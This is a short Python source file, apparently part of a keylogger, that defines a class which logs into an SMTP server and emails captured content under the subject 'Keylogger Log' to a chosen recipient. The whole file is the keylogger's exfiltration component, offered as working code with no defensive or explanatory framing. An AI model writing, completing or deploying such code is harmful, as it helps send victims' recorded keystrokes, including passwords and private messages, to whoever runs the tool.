import smtplib
from email.mime.text import MIMEText

class Sender:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password

    def send_log(self, log_content, recipient):
        msg = MIMEText(log_content)
        msg['Subject'] = 'Keylogger Log'
        msg['From'] = self.username
        msg['To'] = recipient
        
        with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
            server.login(self.username, self.password)
            server.sendmail(self.username, recipient, msg.as_string())
